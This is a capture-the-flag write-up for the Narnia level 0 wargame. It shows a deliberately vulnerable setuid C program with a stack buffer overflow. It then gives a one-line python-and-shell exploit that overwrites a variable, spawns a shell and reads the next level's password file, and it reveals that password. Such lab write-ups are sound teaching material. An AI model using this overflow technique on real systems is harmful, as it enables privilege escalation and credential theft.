# Overview
We have the following C code:
```c
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

It's quickly apparent that by passing a long enough string to `scanf()`, it will overflow `buf` allowing us to overwrite `val`.

# Cracking it
I had to fiddle a bit to find the right format, but here it is:
```
(python3 -c "import sys; sys.stdout.buffer.write(b'bbbbbbbbbbbbbbbbbbbb\xef\xbe\xad\xde')"; echo 'cat /etc/narnia_pass/narnia1') | ./narnia0
```

It uses python to output a sequence of bytes that overflows `val`, then it echoes the command we want to execute, and the whole string is passed as input to narnia0.

Password for the next level is `WDcYUTG5ul`.
